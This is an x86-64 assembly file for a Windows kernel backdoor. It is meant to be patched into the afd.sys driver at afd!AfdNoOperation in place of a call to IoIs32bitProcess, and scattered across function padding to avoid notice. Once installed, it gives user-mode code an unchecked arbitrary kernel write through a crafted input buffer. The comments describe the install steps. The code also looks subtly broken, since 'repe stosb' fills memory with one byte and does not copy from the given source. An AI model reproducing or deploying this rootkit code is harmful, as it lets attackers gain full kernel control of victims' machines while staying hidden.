[BITS 64]

; The backdoor entry-point should be installed within afd!AfdNoOperation, that way it can be easily invoked by user-mode code (that is aware of the backdoor's existence)
; This is also incomplete as the Fragmenter driver will be introducing jump instructions in-between each instruction as this will be filled between each function (that contains padding bytes)

; In order to install the backdoor, the driver should replace the call to IoIs32bitProcess with the following:
; mov 	rax, <entry-point>
; call 	rax
; The instructions that were overwritten should look like the following (check using WinDbg):
; mov	r10,qword ptr [afd!_imp_IoIs32bitProcess (fffff807`1897f960)]
; call	nt!IoIs32bitProcess (fffff807`11eeeb00)

; Note that there are no checks against the system buffer nor the input buffer length
; This backdoor assumes that the input is correctly formatted
; Obviously an incorrect assumption, but I have to fit this into the kernel somehow (without it being a real pain in the ass)

save_registers:
  push rsi
  push rdi
  push rcx

prepare_input_buffer:
  lodsq		; Discard 8 bytes and increment rsi by 8
  lodsq		; Discard 8 bytes and increment rsi by 8
  lodsq		; Discard 8 bytes and increment rsi by 8
  lodsq		; Discard 8 bytes and increment rsi by 8
  lodsq		; Store the Type3InputBuffer in rax
  mov rsi, rax	; Move the buffer pointer to rsi for future usage

perform_write:
  lodsq		; Load 8 bytes into rax
  mov rdi, rax	; Copy the destination address into rdi
  lodsq		; Load another 8 bytes
  mov rcx, rax	; Copy the size into rcx
  lodsq		; Load the last 8 bytes and store the source in rax

  ; rdi is the destination
  ; rax is the source
  ; rcx is the size
  repe stosb	; Perform the arbitrary kernel read/write

restore_registers:
  pop rcx
  pop rdi
  pop rsi

finish:
  xor eax, eax	; Set the return value
  ret		; Return!